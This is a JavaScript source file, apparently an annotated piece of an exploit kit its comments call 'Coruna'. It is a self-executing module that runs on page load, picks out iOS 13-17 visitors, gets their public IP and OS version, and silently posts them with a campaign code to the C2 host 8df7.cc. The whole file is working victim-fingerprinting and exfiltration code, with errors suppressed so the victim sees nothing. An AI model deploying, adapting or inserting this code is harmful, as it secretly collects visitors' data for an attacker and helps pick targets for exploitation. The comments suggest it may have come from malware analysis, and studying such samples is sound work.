/**
 * IP Fingerprinting & Telemetry Module
 * ======================================
 * Self-executing IIFE that:
 *   1. Detects the victim's IP address via multiple services
 *   2. Detects the device OS version
 *   3. Sends telemetry to the C2 server (8df7.cc)
 *
 * Only runs on iOS 13-17 devices.
 *
 * IP Detection Services (in order of preference):
 *   - https://ipv4.icanhazip.com (IPv4 preferred)
 *   - https://api.ipify.org?format=json (IPv4 fallback)
 *   - https://ipv6.icanhazip.com (IPv6 fallback)
 *
 * Telemetry Endpoint:
 *   POST https://8df7.cc/api/ip-sync/sync
 *   Body: { channelCode, ip, deviceVersion }
 *
 * Part of the Coruna exploit kit (group.html).
 */

(function () {
    /** Channel code identifying this exploit campaign */
    const CHANNEL_CODE = "CHMKNI9DW334E60711";

    /**
     * Validate an IPv4 address string
     * @param {string} ip - IP address to validate
     * @returns {boolean} True if valid IPv4
     */
    function isValidIPv4(ip) {
        const isMatch = /^(\d{1,3}\.){3}\d{1,3}$/.test(ip);
        if (!isMatch) return false;
        const octets = ip.split(".");
        return octets.every(octet => {
            const num = parseInt(octet, 10);
            return num >= 0 && num <= 255;
        });
    }

    /**
     * Validate an IPv6 address string
     * @param {string} ip - IP address to validate
     * @returns {boolean} True if valid IPv6
     */
    function isValidIPv6(ip) {
        const isMatch = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::1$|^::$|^([0-9a-fA-F]{1,4}:)*::([0-9a-fA-F]{1,4}:)*[0-9a-fA-F]{1,4}$/.test(ip);
        return isMatch;
    }

    /**
     * Detect the victim's IP address using multiple fallback services.
     * Tries IPv4 first, falls back to IPv6.
     * @returns {Promise<string|null>} IP address or null
     */
    async function detectIPAddress() {
        let ipv6Fallback = null;

        // Try 1: IPv4 via icanhazip
        try {
            const response = await fetch("https://ipv4.icanhazip.com", {
                method: "GET",
                headers: { "Accept": "text/plain" }
            });
            const ip = (await response.text()).trim();
            if (ip && isValidIPv4(ip)) return ip;
        } catch (e) {}

        // Try 2: IPv4 via ipify
        try {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();
            const ip = data.ip ? data.ip.trim() : null;
            if (ip) {
                if (isValidIPv4(ip)) return ip;
                if (isValidIPv6(ip)) ipv6Fallback = ip;
            }
        } catch (e) {}

        // Try 3: IPv6 via icanhazip
        try {
            const response = await fetch("https://ipv6.icanhazip.com", {
                method: "GET",
                headers: { "Accept": "text/plain" }
            });
            const ip = (await response.text()).trim();
            if (ip && isValidIPv6(ip)) return ip;
        } catch (e) {}

        // Return IPv6 from ipify if we got one
        if (ipv6Fallback) return ipv6Fallback;
        return null;
    }

    /**
     * Detect the device OS version from the user agent string.
     * Supports iOS, Android, Windows, macOS, and Linux.
     * @returns {string} OS version string (e.g., "iOS 17.2")
     */
    function detectDeviceVersion() {
        const ua = navigator.userAgent;

        // iOS (standard format)
        const iosMatch = ua.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
        if (iosMatch) {
            const major = parseInt(iosMatch[1], 10);
            const minor = iosMatch[2] || "0";
            return "iOS " + major + "." + minor;
        }

        // iOS (iPhone OS format)
        const iphoneMatch = ua.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
        if (iphoneMatch) {
            const major = parseInt(iphoneMatch[1], 10);
            const minor = iphoneMatch[2] || "0";
            return "iOS " + major + "." + minor;
        }

        // Android
        const androidMatch = ua.match(/Android[_\s](\d+)(?:[._](\d+))?/i);
        if (androidMatch) {
            const major = parseInt(androidMatch[1], 10);
            const minor = androidMatch[2] || "0";
            return "Android " + major + "." + minor;
        }

        // Windows
        const winMatch = ua.match(/Windows NT (\d+)\.(\d+)/i);
        if (winMatch) {
            const major = parseInt(winMatch[1], 10);
            const minor = winMatch[2] || "0";
            return "Windows " + major + "." + minor;
        }

        // macOS
        const macMatch = ua.match(/Mac OS X (\d+)[._](\d+)/i);
        if (macMatch) {
            const major = parseInt(macMatch[1], 10);
            const minor = macMatch[2] || "0";
            return "macOS " + major + "." + minor;
        }

        // Linux
        if (/Linux/i.test(ua)) return "Linux";

        // Browser fallback
        const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+)/i);
        if (browserMatch) return browserMatch[1] + " " + browserMatch[2];

        return ua.substring(0, 50) + "...";
    }

    /**
     * Check if the device is running iOS 13-17 (the target range)
     * @returns {boolean} True if iOS version is in range
     */
    function isTargetIOSVersion() {
        const ua = navigator.userAgent;

        const iosMatch = ua.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
        if (iosMatch) {
            const major = parseInt(iosMatch[1], 10);
            return major >= 13 && major <= 17;
        }

        const iphoneMatch = ua.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
        if (iphoneMatch) {
            const major = parseInt(iphoneMatch[1], 10);
            return major >= 13 && major <= 17;
        }

        return false;
    }

    /**
     * Send telemetry data to the C2 server.
     * POST to https://8df7.cc/api/ip-sync/sync with device info.
     */
    async function sendTelemetry() {
        try {
            // Only target iOS 13-17
            if (!isTargetIOSVersion()) return;

            const channelCode = CHANNEL_CODE;
            const ip = await detectIPAddress();
            const deviceVersion = detectDeviceVersion();

            if (!channelCode || !ip || !deviceVersion) return;

            const apiBase = "https://8df7.cc/api";
            const response = await fetch(apiBase + "/ip-sync/sync", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    channelCode: channelCode,
                    ip: ip,
                    deviceVersion: deviceVersion
                })
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                // Error silently ignored
            }
        } catch (e) {
            // All errors silently ignored
        }
    }

    // Execute telemetry after 1 second delay
    setTimeout(sendTelemetry, 1000);
})();
